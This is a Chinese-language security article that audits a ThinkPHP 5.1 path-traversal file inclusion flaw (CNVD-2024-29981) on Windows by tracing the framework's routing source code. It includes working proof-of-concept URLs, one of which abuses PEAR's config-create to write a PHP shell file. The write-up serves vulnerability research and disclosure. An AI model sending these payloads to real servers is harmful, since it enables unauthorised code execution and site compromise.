#  Thinkphp5.1.0-Thinkphp5.1. 文件包含漏洞（CNVD-2024-29981）   
 安全工程师实录   2024-11-12 21:02  
  
声明：请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者和本公众号无关。  
<table><tbody><tr><td style="word-break: break-all;" width="558" valign="top"><h1 style=""><span style=" color: rgb(255, 76, 65); ; " data-darkreader-inline-color=""><span style="font-family: 宋体;font-variant: normal;text-transform: none;">Thinkphp5.1.0-Thinkphp5.1.*文件包含漏洞 (CNVD-2024-29981)</span>
  </span></h1><p style="margin-top:15.6pt;mso-para-margin-top:1.0gd;margin-bottom:2.5pt;text-align:left;margin-left:0.0pt;line-height:150%;"><span style=" font-size: 11pt;font-family: 宋体;font-variant: normal;text-transform: none;font-weight: normal;font-style: normal;color: rgb(255, 76, 65); ; " data-darkreader-inline-color="">time 4.24</span></p><p style="margin-top:15.6pt;mso-para-margin-top:1.0gd;margin-bottom:2.5pt;text-align:left;margin-left:0.0pt;line-height:150%;"><span style=" font-size: 11pt;font-family: 宋体;font-variant: normal;text-transform: none;font-weight: normal;font-style: normal;color: rgb(255, 76, 65); ; " data-darkreader-inline-color="">测试版本：thinkphp 5.1.41</span></p><p style="margin-top:15.6pt;mso-para-margin-top:1.0gd;margin-bottom:2.5pt;text-align:left;margin-left:0.0pt;line-height:150%;"><span style=" font-size: 11pt;font-family: 宋体;font-variant: normal;text-transform: none;font-weight: normal;font-style: normal;color: rgb(255, 76, 65); ; " data-darkreader-inline-color="">php: 7.3.4</span></p><p style="margin-top:15.6pt;mso-para-margin-top:1.0gd;margin-bottom:2.5pt;text-align:left;margin-left:0.0pt;line-height:150%;"><span style=" font-size: 11pt;font-family: 宋体;font-variant: normal;text-transform: none;font-weight: normal;font-style: normal;color: rgb(255, 76, 65); ; " data-darkreader-inline-color="">影响范围：thinkphp5.1.0--thinkphp5.1.* （windows）: linux无法利用</span></p><p style="margin-top:15.6pt;mso-para-margin-top:1.0gd;margin-bottom:2.5pt;text-align:left;margin-left:0.0pt;line-height:150%;"><span style=" font-size: 11pt;font-family: 宋体;font-variant: normal;text-transform: none;font-weight: normal;font-style: normal;color: rgb(255, 76, 65); ; " data-darkreader-inline-color="">漏洞利用poc: index.php?s=..\..\你要包含的路径/index/index</span></p><p style="margin-top:15.6pt;mso-para-margin-top:1.0gd;margin-bottom:2.5pt;text-align:left;margin-left:0.0pt;line-height:150%;"><span style=" font-size: 11pt;font-family: 宋体;font-variant: normal;text-transform: none;font-weight: normal;font-style: normal;color: rgb(255, 76, 65); ; " data-darkreader-inline-color="">pear进行命令执行poc :</span></p><span style=" font-size: 11pt;font-family: 宋体;font-variant: normal;text-transform: none;font-weight: normal;font-style: normal;color: rgb(255, 76, 65); ; " data-darkreader-inline-color="">/index.php?s=..\..\..\Extensions\php\php7.3.4nts\pear\&amp;+config-create+/+1.php</span><span style=" font-size: 11pt;font-family: 宋体;font-variant: normal;text-transform: none;color: rgb(0, 0, 0);font-weight: normal;font-style: normal; ; " data-darkreader-inline-color=""></span></td></tr></tbody></table>#   
  
  
  
  
调用堆栈：  
      
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UhkxNXNt9yaZW6O66FubWOQkMS8PxVznZrnoaicQOrrHKatpYjKwbFc4ic6pcNNLB6Dm9vAHdhdF1OScibDX2Kenw/640?wx_fmt=png "")  
  
  
#   
# 一.Thinkphp文件包含:    
  
  
在Thinkphp5中路由可以使用一下两种方式都可以访问到执行的方法中如：  
  
  
  
http://127.0.0.1/index.php/index/index/hello  
  
  
  
http://127.0.0.1/index.php?s=index/index/hello  
  
  
简单一点来说其实就是对应的   
模块  
/控制器/方法  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UhkxNXNt9yaZW6O66FubWOQkMS8PxVznDrHibCPM8PFJAv3WhiccoK584lxLDibx69dQIPJVKRBxtpytC1hZT4Ziaw/640?wx_fmt=png "")  
  
  
      
## 1.1: Thinkphp5.1.41审计过程    
  
  
首先需要触发路由  
  
  
  
http://127.0.0.1/index.php?s=index/index/hello  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UhkxNXNt9yaZW6O66FubWOQkMS8PxVznVsEzgibOQGiarUSH3CezdQMNFuDQicZCooNuvzr960bDibdaiba3rzcNRqA/640?wx_fmt=png "")  
  
  
  
进入run方法，  
      
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UhkxNXNt9yaZW6O66FubWOQkMS8PxVznhwRRWW7MaPJAunxJZEdQFUS0ibIniauwX3rF1RmPH63zxOzykXnPMMQg/640?wx_fmt=png "")  
  
  
走到405行routeCheck方法，根据注释也可以看出来是进行路由检测接着往下看，  
      
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UhkxNXNt9yaZW6O66FubWOQkMS8PxVzn4ZGvXTH1MGuhjLy3fuu0lY6VNicEia7g2ibTMHLr9LrxT7oT8wrcoVN9A/640?wx_fmt=png "")  
  
  
600行path方法，  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UhkxNXNt9yaZW6O66FubWOQkMS8PxVzntOkWtFox8xYGFQ2zTnMEpmKIiae9mdXgaKE1fqOam7IaZGZldLl6NWA/640?wx_fmt=png "")  
  
  
  
  
上面执行到了pathinfo,名字可以看出来就是路径信息的意思，下面是具体代码。  
    
```
   public function pathinfo()
{
        if (is_null($this->pathinfo)) {
            if (isset($_GET[$this->config['var_pathinfo']])) {
                // 判断URL里面是否有兼容模式参数
                $pathinfo = $_GET[$this->config['var_pathinfo']];
                unset($_GET[$this->config['var_pathinfo']]);
                unset($this->get[$this->config['var_pathinfo']]);
            } elseif ($this->isCli()) {
                // CLI模式下 index.php module/controller/action/params/...
                $pathinfo = isset($_SERVER['argv'][1]) ? $_SERVER['argv'][1] : '';
            } elseif ('cli-server' == PHP_SAPI) {
                $pathinfo = strpos($this->server('REQUEST_URI'), '?') ? strstr($this->server('REQUEST_URI'), '?', true) : $this->server('REQUEST_URI');
            } elseif ($this->server('PATH_INFO')) {
                $pathinfo = $this->server('PATH_INFO');
            }

            // 分析PATHINFO信息
            if (!isset($pathinfo)) {
                foreach ($this->config['pathinfo_fetch'] as $type) {
                    if ($this->server($type)) {
                        $pathinfo = (0 === strpos($this->server($type), $this->server('SCRIPT_NAME'))) ?
                        substr($this->server($type), strlen($this->server('SCRIPT_NAME'))) : $this->server($type);
                        break;
                    }
                }
            }

            if (!empty($pathinfo)) {
                unset($this->get[$pathinfo], $this->request[$pathinfo]);
            }

            $this->pathinfo = empty($pathinfo) || '/' == $pathinfo ? '' : ltrim($pathinfo, '/');
        }

        return $this->pathinfo;
    }
```  
```
 //关键点看下面的代码
if (isset($_GET[$this->config['var_pathinfo']])) {
                $pathinfo = $_GET[$this->config['var_pathinfo']];
                unset($_GET[$this->config['var_pathinfo']]);
                unset($this->get[$this->config['var_pathinfo']]);
  其中$this->config['var_pathinfo']是s参数也就是说获取了s的参数，并且销毁了GET传入的
s,和当前类的$this->get[s]的内容返回值是$pathinfo就是我们s传的内容。
  好了再回到path，会走到if里面其中也就是匹配我们传的参数有没有.html,意义不大。
$this->path = preg_replace('/\.(' . ltrim($suffix, '.') . ')$/i', '', $pathinfo);
```  
  
上面就是获取url参数，routeCheck并没有结束  
```
606行 $dispatch = $this->route->check($path, $must); 
这个没什么太多必要进去看，写的又臭又烂，关键点就是执行think\route\dispatch\url类
在就是把/替换成|。
下面是执行过程截图。
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UhkxNXNt9yaZW6O66FubWOQkMS8PxVznb8kicucpxF0mozhNJsZ9zYH13CspoIv9XDJUeXVR4T4JGD5pWcmic4zA/640?wx_fmt=png "")  
  
  
      
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UhkxNXNt9yaZW6O66FubWOQkMS8PxVzn4NGEZQYF5umykTUMkwskoCMMwmIicgYn9BSeIvJPmIwXDnBpsGKFcRg/640?wx_fmt=png "")  
  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UhkxNXNt9yaZW6O66FubWOQkMS8PxVznrMPC5ItRHeldptU9rficBNzmRREAfmX7foqfmdicu7etC5gzyiadVEhfA/640?wx_fmt=png "")  
  
  
  
  
然后就直接return了，在看看init方法做了什么。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UhkxNXNt9yaZW6O66FubWOQkMS8PxVzngobYvFibwaqRjlBiahq8Bky4KBjZRRm350EfavNhfuQ2ZI43P6EuuXGw/640?wx_fmt=png "")  
  
  
  
  
parseUrl方法是把路由进行分割成数组，      
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UhkxNXNt9yaZW6O66FubWOQkMS8PxVznA1OmcmGRvdYw0vAIVJrXTNQwbfc9eE8dMiakgyIK3SGhQugdIvHsXNg/640?wx_fmt=png "")  
  
  
```
    public function parseUrlPath($url)
{
        // 分隔符替换 确保路由定义使用统一的分隔符
        $url = str_replace('|', '/', $url);
        $url = trim($url, '/');
        $var = [];

        if (false !== strpos($url, '?')) {
            // [模块/控制器/操作?]参数1=值1&参数2=值2...
            $info = parse_url($url);
            $path = explode('/', $info['path']);
            parse_str($info['query'], $var);
        } elseif (strpos($url, '/')) {
            // [模块/控制器/操作]
            $path = explode('/', $url);
        } elseif (false !== strpos($url, '=')) {
            // 参数1=值1&参数2=值2...
            $path = [];
            parse_str($url, $var);
        } else {
            $path = [$url];
        }

        return [$path, $var];
```  
  
  
  
```
关键代码，也就是之前|在变回去了。
$url = str_replace('|', '/', $url);
下面就是分割成一个数组，这里是重点。
elseif (strpos($url, '/')) {
            // 模块
            $path = explode('/', $url);
```  
  
最后给到$path并且在54行$module在获取数组第一个，后面就直接return了。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UhkxNXNt9yaZW6O66FubWOQkMS8PxVznEYDibiagssu5TNss9ZKxHxfQ9Pldwvpq7ybJKZ8hROZ50p2iaWfKNmaYA/640?wx_fmt=png "")  
  
  
  
  
我们返回去看25行可以看到返回的时候new了一个类，并且执行了Module类的init方法跟进去。  
      
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UhkxNXNt9yaZW6O66FubWOQkMS8PxVznPlXxLUZib0a2vIYeaIV7HWsHh10bVyknS7BCFnlVLQVqcaXcVvks1gw/640?wx_fmt=png "")  
  
  
至此到现在$this->dispatch都是我们能控制的，但是可以看到再次把/进行分割成数组了，所以/算是pass了，然后我们往下看，$result[0]也就是数组第一个给到$module。  
  
```
if ($this->rule->getConfig('app_multi_module')) {
  // 多模块部署
  $module    = strip_tags(strtolower($result[0] ?: $this->rule->getConfig('default_module')));
  $bind      = $this->rule->getRouter()->getBind();
  $available = false;

  if ($bind && preg_match('/^[a-z]/is', $bind)) {
    // 绑定模块
    list($bindModule) = explode('/', $bind);
    if (empty($result[0])) {
      $module = $bindModule;
    }
    $available = true;
  } elseif (!in_array($module, $this->rule->getConfig('deny_module_list')) && is_dir($this->app->getAppPath() . $module)) {
    $available = true;
```  
  
```
关键点也是重点，is_dir再熟悉不过了$this->app->getAppPath() 具体输出一下就可以路径了看到了
D://绝对路径/application/，主要看$module上面提到了这个是我们可控制的呀，但是限制了/。
 } elseif (!in_array($module, $this->rule->getConfig('deny_module_list')) && is_dir($this->app->getAppPath() . $module)) {
    $available = true;
```  
  
  
  
$available变量为false,先让他为true，看到50行的时候是可以让$available变量为true,但是存在一个if，第一个条件是不为数组这个可以直接过了，因为在38行的时候他已经不是数组了，第2个条件是获取目录再加上$module变量其中$module变量是可以控制的，也就是说判断是否是一个真实存在的路径$this->app->getAppPath() 路径地址是 D://绝对路径/application/$module,那么大致思路就清晰了，默认情况下application存在 index extra，上面说到/已经用不了了因为他进行了2次分割成了数组，但是可以通过..\跳目录，这样..\就在一个value中不会进行分割，这也是为什么linux系统无法利用的原因，可以看下图上面也有分析到。  
      
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UhkxNXNt9yaZW6O66FubWOQkMS8PxVznGTW3KpBWzRglSicWF6IeBGqX50f4r7hdvuCah3MFSDZPpsia4ibJKElgA/640?wx_fmt=png "")  
  
  
例如 ..\..\aa/bb/cc 分割成数组，但是..\并没有进行分割，在执行到parseUrl方法54行array_shift($path) 获取第一个数组也就是..\..\aa,60行的时候获取到了bb，所以这块就绕过了，然后我们思路再次回到 Module类，49行使用..\就可以走到true, 后面的57行if就可以就下去在走到60行的app类里面的init方法。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UhkxNXNt9yaZW6O66FubWOQkMS8PxVznO93CibpCVxztM75aNX7iam91zHGFwtv9icckkichvK2k2yfVH7E62U80kQ/640?wx_fmt=png "")  
  
  
      
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UhkxNXNt9yaZW6O66FubWOQkMS8PxVznnjakLicLxiaZiavWZhVuyxIvdbXw1DUBGZ1LOooVEiaM7d400rGuvraHXg/640?wx_fmt=png "")  
  
  
可以看到323行遍历循环了一个参数$files，$files是从$module过来的，$module是我们的..\..\aa,321行获取了目录下面所有文件放到数组里面进行循环，在获取文件扩展名进行强比较,$this->configExt是php,所以在根目录下面创建目录，目录里面创建一个文件1.php 内容 /index.php?s=..\..\..\..\..\..\..\admin/user/name 其中admin是目录，user和name随便写,然后再去看load方法  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UhkxNXNt9yaZW6O66FubWOQkMS8PxVzniaK8q0STCm0uZ7S3BG6uicFIrEaSfb7NRGDqlB9cTFXYWQshFYtG4iaNg/640?wx_fmt=png "")  
  
  
也就是看文件是否存在，再去loadFile方法，  
      
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UhkxNXNt9yaZW6O66FubWOQkMS8PxVzn90ibWEc2ornDAicFQRR546sTzQvz693C7aGMT0yoSPbBrbx43hqAfhoQ/640?wx_fmt=png "")  
  
  
查看扩展名是否是php，然后直接包含,为什么linux不能利用是因为linux不支持..\  
## 1.2: 漏洞利用    
  
  
Version: thinkphp5.1.35  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UhkxNXNt9yaZW6O66FubWOQkMS8PxVznkR40YzZItcg0II8FKNq4vshtPVz25cEHYHBsRV9DdQv1W34QyeqibhQ/640?wx_fmt=png "")  
  
  
  
  
thinkphp目录 D:\phpStudy\WWW\thinkphp5\public，在D盘根目录创建一个文件夹，下面存放1.php，            内容phpinfo();            

            POC: index.php?s=..\..\..\..\thinkphp5.1/xinyi/xinyi              
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UhkxNXNt9yaZW6O66FubWOQkMS8PxVznickvgaicCxzT94esFv3ZsgShnSdSqAdUwiaTTvnyt2YKpX1uk28U91wTw/640?wx_fmt=png "")  
  
  
      
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UhkxNXNt9yaZW6O66FubWOQkMS8PxVznedibUe5ibcbhdPibExtBWNtDZWtIpqicNTX2qV6JKx22hQop6sk21jPicFQ/640?wx_fmt=png "")  
  
  
## 1.3: 命令执行(pear写shell)    
  
  
POC:            /index.php?s=..\..\..\Extensions\php\php7.3.4nts\pear\&+config-create+/+1.php              
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UhkxNXNt9yaZW6O66FubWOQkMS8PxVznJPbWQtrldZdibEZoHhX2vbp2B3WVuvzKbgxL3VnCvYvCpgBEVEz05NQ/640?wx_fmt=png "")  
  
  
      
  
  
微信公众号用不习惯格式可能会有部分错误，公众号回复: think5.1  
  
(pdf)  
  
